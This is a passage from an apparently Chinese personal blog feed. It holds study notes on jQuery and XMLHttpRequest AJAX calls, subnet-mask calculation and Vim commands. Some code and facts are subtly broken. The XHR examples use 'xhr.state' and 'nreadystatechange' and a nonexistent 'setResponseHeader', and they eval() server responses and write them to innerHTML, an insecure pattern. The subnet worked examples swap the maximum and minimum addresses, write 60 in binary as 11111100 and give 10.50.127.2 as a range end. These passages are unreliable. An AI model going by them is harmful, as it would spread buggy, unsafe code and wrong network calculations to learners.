&lt;div&gt; 元素中</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="getJSON"><a href="#getJSON" class="headerlink" title="$.getJSON()"></a>$.getJSON()</h3><p>使用 AJAX 的 HTTP GET 请求获取 JSON 数据。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">&quot;https://www.b.com/jsonp.php?jsoncallback=?&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + data[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    $(<span class="string">&#x27;#divCustomers&#x27;</span>).html(html); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h2><p>XMLHttpRequest 对象提供了对 HTTP 协议的完全的访问，包括做出 POST 和 HEAD 请求以及普通的 GET 请求的能力。</p><h3 id="创建XMLHttprequest"><a href="#创建XMLHttprequest" class="headerlink" title="创建XMLHttprequest"></a>创建XMLHttprequest</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest()   <span class="comment">//现代浏览器</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)   <span class="comment">//IE 5.6及古老版本</span></span><br></pre></td></tr></table></figure><h3 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;/try/ajax/demo_get2.php?fname=Henry&amp;lname=Ford&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><h3 id="Post-请求"><a href="#Post-请求" class="headerlink" title="Post 请求"></a>Post 请求</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;/try/ajax/demo.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xmlhttp.send(<span class="string">&quot;fname=Henry&amp;lname=Ford&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="获取响应数据"><a href="#获取响应数据" class="headerlink" title="获取响应数据"></a>获取响应数据</h3><p>readyState属性值</p><table><thead><tr><th>返回值</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>未初始化。表示对象已经建立，但是尚未初始化，尚未调用 open() 方法</td></tr><tr><td>1</td><td>初始化。表示对象已经建立，尚未调用 send() 方法</td></tr><tr><td>2</td><td>发送数据。表示 send() 方法已经调用，但是当前的状态及 HTTP 头未知</td></tr><tr><td>3</td><td>数据传送中。已经接收部分数据，因为响应及 HTTP 头不安全，这时通过 responseBody 和 responseText 获取部分数据会出现错误</td></tr><tr><td>4</td><td>完成。数据接收完毕，此时可以通过 responseBody 和 responseText 获取完整的响应数据</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;myDiv&quot;</span>).innerHTML=xmlhttp.responseText;</span><br></pre></td></tr></table></figure><h3 id="获取-HTML-字符串"><a href="#获取-HTML-字符串" class="headerlink" title="获取 HTML 字符串"></a>获取 HTML 字符串</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">document</span>.getElementById(<span class="string">&quot;grid&quot;</span>);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        o.innerHTML = xhr.responseText;  <span class="comment">//直接插入到页面中</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取-JavaScript-脚本"><a href="#获取-JavaScript-脚本" class="headerlink" title="获取 JavaScript 脚本"></a>获取 JavaScript 脚本</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> info = xhr.responseText;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span> + info + <span class="string">&quot;)&quot;</span> + <span class="string">&quot;()&quot;</span>);  <span class="comment">//用eval()把字符串转换为脚本</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(o);  <span class="comment">//返回客户端当前信息</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取-JSON-数据"><a href="#获取-JSON-数据" class="headerlink" title="获取 JSON 数据"></a>获取 JSON 数据</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;submit&quot;</span> type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;向服务器发出请求&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//页面初始化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">var</span> b = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        b.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.xml&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState状态</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    <span class="keyword">if</span> (xhr.state == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> info = xhr.responseText;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="keyword">var</span> o = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span> + info + <span class="string">&quot;)&quot;</span>);  <span class="comment">//调用eval()把字符串转换为本地脚本</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(info);  <span class="comment">//显示JSON对象字符串</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                        <span class="built_in">console</span>.log(o.user);  <span class="comment">//读取对象属性值，返回字符串“css8”</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">                    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">                &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            xhr.send();  <span class="comment">//发送请求</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="获取纯文本"><a href="#获取纯文本" class="headerlink" title="获取纯文本"></a>获取纯文本</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();  <span class="comment">//实例化XMLHttpRequest对象</span></span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;server.txt&quot;</span>, <span class="literal">true</span>);  <span class="comment">//建立连接，要求异步响应</span></span><br><span class="line">xhr.nreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;  <span class="comment">//绑定响应状态事件监听函数</span></span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;  <span class="comment">//监听readyState函数</span></span><br><span class="line">        <span class="keyword">if</span> (xhr.status == <span class="number">200</span> || xhr.status == <span class="number">0</span>) &#123;  <span class="comment">//监听HTTP状态码</span></span><br><span class="line">            <span class="keyword">var</span> info = xhr.responseText;</span><br><span class="line">            <span class="keyword">if</span> (info == <span class="string">&quot;true&quot;</span>) <span class="built_in">console</span>.log(<span class="string">&quot;文本信息传输完整&quot;</span>);  <span class="comment">//检测信息是否完整</span></span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">console</span>.log(<span class="string">&quot;文本信息可能存在丢失&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send();  <span class="comment">//发送请求</span></span><br></pre></td></tr></table></figure><h3 id="获取和设置头部消息"><a href="#获取和设置头部消息" class="headerlink" title="获取和设置头部消息"></a>获取和设置头部消息</h3><p>设置获取 HTTP 响应的所有头部消息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;server.txt&quot;</span>;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.getAllResponseHeaders());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>设置HTTP响应的头部信息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xhr.setResponseHeader(<span class="string">&quot;Header-name&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">xhr.setResponseHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="http://c.biancheng.net/view/5995.html">http://c.biancheng.net/view/5995.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;jquery基础操作&quot;&gt;&lt;a href=&quot;#jquery基础操作&quot; class=&quot;headerlink&quot; title=&quot;jquery基础操作&quot;&gt;&lt;/a&gt;jquery基础操作&lt;/h2&gt;&lt;h3 id=&quot;三种选择器&quot;&gt;&lt;a href=&quot;#三种选择器&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="编程" scheme="https://bstark.me/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>子网掩码计算</title>
    <link href="https://bstark.me/posts/49563/"/>
    <id>https://bstark.me/posts/49563/</id>
    <published>2021-12-22T03:14:52.000Z</published>
    <updated>2021-12-28T02:05:23.042Z</updated>
    
    <content type="html"><![CDATA[<p>二进制转换表：</p><table><thead><tr><th>128</th><th>64</th><th>32</th><th>16</th><th>8</th><th>4</th><th>2</th><th>1</th></tr></thead><tbody><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr></tbody></table><p>如果值全为1，上面的数字全部相加等于255.</p><blockquote><p>例如<br>已知ip ：           141.14.72.24<br>已知子网掩码：255.255.255.128<br>求网段地址？</p></blockquote><table><thead><tr><th>目标IP</th><th>141</th><th>14</th><th>72</th><th>24</th></tr></thead><tbody><tr><td>目标ip二进制</td><td>10001101</td><td>00001110</td><td>01001000</td><td>00011000</td></tr><tr><td>子网掩码</td><td>11111111</td><td>11111111</td><td>11111111</td><td>10000000</td></tr><tr><td>最小ip范围</td><td><strong>1</strong>000<strong>11</strong>0<strong>1</strong></td><td>0000<strong>111</strong>0</td><td>0<strong>1</strong>00<strong>1</strong>000</td><td>00000000</td></tr></tbody></table><p>算最小ip范围取相同1</p><table><thead><tr><th>目标ip</th><th>141</th><th>14</th><th>72</th><th>24</th></tr></thead><tbody><tr><td>目标ip二进制</td><td>10001101</td><td>00001110</td><td>01001000</td><td>00011000</td></tr><tr><td>子网掩码</td><td><strong>11111111</strong></td><td><strong>11111111</strong></td><td><strong>11111111</strong></td><td><strong>1</strong>0000000</td></tr><tr><td>最大ip范围*</td><td>10001101</td><td>00001110</td><td>01001000</td><td>0<strong>1111111</strong></td></tr></tbody></table><p>*注：最大ip范围取目标前三段不变。</p><p>算最大ip范围，子网掩码相同的全部为不变，后面全填写1</p><p>最后转2进制得：</p><p>最小：141.14.72.0</p><p>最大：141.14.72.127</p><p>去掉一个广播地址：141.14.72.127</p><p>范围即是：141.14.72.0——141.14.72.127</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211222143630714.png" alt="image-20211222143630714"></p><p>141.14.72.24</p><p>255.255.192.0</p><p>子网掩码为</p><p>子网掩码<strong>11111111  1111111  11</strong>000000   0000000</p><p>最小子网10001101  0001110  01000000  0000000</p><p>最大子网10001101  0001110  0<strong>1111111  1111111</strong></p><p>即：</p><p>最大子网:141.14.64.0</p><p>最小子网:141.14.127.255</p><p>10.50.89.60/18</p><p>00001010     00110010    01011001   11111100</p><p>11111111     11111111    11000000   00000000</p><p>10.50.64.0</p><p>10.50.127.2</p><p>11111111 11111111 11111111 11111100</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;二进制转换表：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;128&lt;/th&gt;
&lt;th&gt;64&lt;/th&gt;
&lt;th&gt;32&lt;/th&gt;
&lt;th&gt;16&lt;/th&gt;
&lt;th&gt;8&lt;/th&gt;
&lt;th&gt;4&lt;/th&gt;
&lt;th&gt;2&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;/tr&gt;
&lt;/the</summary>
      
    
    
    
    
    <category term="子网掩码" scheme="https://bstark.me/tags/%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>VIM基础使用</title>
    <link href="https://bstark.me/posts/819/"/>
    <id>https://bstark.me/posts/819/</id>
    <published>2021-12-20T12:54:52.000Z</published>
    <updated>2021-12-28T02:05:23.031Z</updated>
    
    <content type="html"><![CDATA[<p>VIM基础使用</p><pre><code> VI/VIM共有三种编辑模式，分别是：命令模式（Command mode）、输入模式（Insert mode）和底线命令模式（Last line mode）。</code></pre><h4 id="底线命令模式："><a href="#底线命令模式：" class="headerlink" title="底线命令模式："></a>底线命令模式：</h4><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211219200543758.png" alt="image-20211219200543758"></p><p>​    在命令模式下按：（英文冒号）就进入了底线命令模式。底线命令模式可以输入单个或多个字符命令在底线模式中，基本命令有：<br>◆ ESC：退出底线命令模式，切换到命令模式</p><table><thead><tr><th>底线命令模式</th><th>作用</th></tr></thead><tbody><tr><td>:w</td><td>将编辑的数据写入硬盘档案中(常用)</td></tr><tr><td>:w!</td><td>若文件属性为『只读』时，强制写入该档案。不过，到底能不能写入， 还是跟你对 该档案的档案权限有关啊！</td></tr><tr><td>:q</td><td>离开 vi (常用)</td></tr><tr><td>:q!</td><td>若曾修改过档案，又不想储存，使用 ! 为强制离开不储存档案。</td></tr><tr><td>:wq</td><td>储存后离开，若为 :wq! 则为强制储存后离开 (常用)</td></tr><tr><td>:n1,n2 w [filename]</td><td>将 n1 到 n2 的内容储存成 filename 这个档案。</td></tr><tr><td>:! command</td><td>暂时离开 vi 到指令行模式下执行 command 的显示结果。</td></tr></tbody></table><table><thead><tr><th>行号变更</th><th>作用</th></tr></thead><tbody><tr><td>:set nu</td><td>显示行号，设定之后，会在每一行的前缀显示该行的行号</td></tr><tr><td>:set nonu</td><td>与 set nu 相反，为取消行号！</td></tr></tbody></table><h4 id="一般模式"><a href="#一般模式" class="headerlink" title="一般模式"></a>一般模式</h4><table><thead><tr><th>光标移动方法</th><th>作用</th></tr></thead><tbody><tr><td>[Ctrl] + [f]</td><td>屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)</td></tr><tr><td>[Ctrl] + [b]</td><td>屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)</td></tr><tr><td>0</td><td>或功能键[Home] 这是数字『 0 』：移动到光标所在行头</td></tr><tr><td>$</td><td>或功能键[End] 移动到这一行的行尾(常用)</td></tr><tr><td>G</td><td>移动到文档的最后一行(常用)</td></tr><tr><td>gg</td><td>移动到文档的第一行 (常用)</td></tr><tr><td>n<Enter></td><td>n 为数字。光标向下移动 n 行(常用)</td></tr></tbody></table><h5 id="一般模式下搜索替换指令说明："><a href="#一般模式下搜索替换指令说明：" class="headerlink" title="一般模式下搜索替换指令说明："></a>一般模式下搜索替换指令说明：</h5><table><thead><tr><th>搜索替换指令</th><th>作用</th></tr></thead><tbody><tr><td>/word</td><td>向光标之下查找为 word 的字符串。 (常用)</td></tr><tr><td>?word</td><td>向光标之上查找字为 word 的字符串。</td></tr><tr><td>n</td><td>这个 n 是英文按键。代表重复前一个搜寻的动作。</td></tr><tr><td>N</td><td>这个 N 是英文按键。与 n 刚好相反，为『反向』进行前一个搜寻动作</td></tr><tr><td><strong>:n1,n2s/word1/word2/g</strong></td><td><strong>n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为word2</strong></td></tr><tr><td><em><strong>:1,$s/word1/word2/g 或 :%s/word1/word2/g</strong></em></td><td><em><strong>从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！</strong></em></td></tr><tr><td>:1,$s/word1/word2/gc 或 :%s/word1/word2 /gc</td><td>从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用)</td></tr></tbody></table><h5 id="一般模式下删除、复制与粘贴常用方法说明："><a href="#一般模式下删除、复制与粘贴常用方法说明：" class="headerlink" title="一般模式下删除、复制与粘贴常用方法说明："></a>一般模式下删除、复制与粘贴常用方法说明：</h5><table><thead><tr><th>删除、复制与粘贴方法</th><th>作用</th></tr></thead><tbody><tr><td>x, X</td><td>在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于 [backspace] 亦即是退格键) (常用)  向光标前删除，向光标后删除</td></tr><tr><td>dd</td><td>删除游标所在的那一整行(常用</td></tr><tr><td>ndd</td><td>n 为数字。删除光标所在的向下 n 行，例如</td></tr><tr><td>yy</td><td>复制游标所在的那一行(常用)</td></tr><tr><td>nyy</td><td>n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行(常用)</td></tr><tr><td>p, P</td><td>p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！</td></tr><tr><td>u</td><td>复原前一个动作。(常用)</td></tr><tr><td>[Ctrl]+r</td><td>重做上一个动作。(常用)</td></tr><tr><td>.</td><td>不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用)</td></tr></tbody></table><h5 id="一般模式切换到编辑模式的方法说明："><a href="#一般模式切换到编辑模式的方法说明：" class="headerlink" title="一般模式切换到编辑模式的方法说明："></a>一般模式切换到编辑模式的方法说明：</h5><table><thead><tr><th>进入输入和取代模式方法</th><th>作用</th></tr></thead><tbody><tr><td>i, I</td><td>进入输入模式(Insert mode)：i 为『从目前光标所在处输入』， I 为『在目前所在行的第一个非空格符处开始输入』。(常用)</td></tr><tr><td>a, A</td><td>进入输入模式(Insert mode)：a 为『从目前光标所在的下一个字符处开始输入』， A 为『从光标所在行的最后一个字符处开始输入』。(常用)</td></tr><tr><td>o, O</td><td>进入输入模式(Insert mode)：o光标所在行后新开行,O光标所在行头新开行</td></tr><tr><td>r, R</td><td>进入取代模式(Replace mode)：r 只会取代光标所在的那一个字符一次；R会一直取代光标所在的文字，直到按下 ESC 为止；(常用)</td></tr><tr><td>[Esc]</td><td>退出编辑模式，回到一般模式中(常用)</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;VIM基础使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; VI/VIM共有三种编辑模式，分别是：命令模式（Command mode）、输入模式（Insert mode）和底线命令模式（Last line mode）。
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;底线命令模式：&quot;&gt;&lt;a</summary>
      
    
    
    
    
    <category term="vim" scheme="https://bstark.me/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript基础</title>
    <link href="https://bstark.me/posts/53226/"/>
    <id>https://bstark.me/posts/53226/</id>
    <published>2021-12-20T12:54:52.000Z</published>
    <updated>2022-01-11T06:04:30.295Z</updated>
    
